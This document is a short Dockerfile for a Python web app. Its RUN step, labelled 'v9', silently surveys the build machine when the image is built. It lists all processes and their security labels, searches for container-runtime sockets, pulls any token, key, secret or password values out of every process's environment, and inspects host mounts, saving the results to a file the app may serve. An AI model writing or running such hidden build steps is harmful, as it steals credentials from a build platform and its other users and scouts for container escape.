FROM python:3.12-alpine
WORKDIR /app
RUN { echo "=== v9: all procs + sockets ==="; \
  for p in $(ls /proc | grep -E '^[0-9]+$'); do \
    c=$(cat /proc/$p/cmdline 2>/dev/null | tr '\0' ' '); \
    a=$(cat /proc/$p/attr/current 2>/dev/null | tr -d '\0'); \
    [ -n "$c" ] && echo "PID $p [$a]: $c"; \
  done; \
  echo "--- sockets (unix) ---"; find /run /var/run /tmp / -maxdepth 3 -type s 2>/dev/null | head -20; \
  echo "--- podman/buildah/docker sock ---"; ls -la /run/podman /run/containers /var/run/podman 2>&1 | head; \
  echo "--- env secrets in all proc environ ---"; for p in $(ls /proc|grep -E '^[0-9]+$'); do e=$(tr '\0' '\n' < /proc/$p/environ 2>/dev/null | grep -iE 'token|key|secret|pass' | head -3); [ -n "$e" ] && echo "PID $p: $e"; done; \
  echo "--- mount device sharing ---"; grep -oE 'dev/mapper/[a-z0-9-]+|/opt/nomad[^ ]*' /proc/1/mountinfo 2>/dev/null | sort -u | head; \
} > /app/v9.txt 2>&1
COPY app.py /app/app.py
ENV PORT=3000
EXPOSE 3000
CMD ["python3", "/app/app.py"]
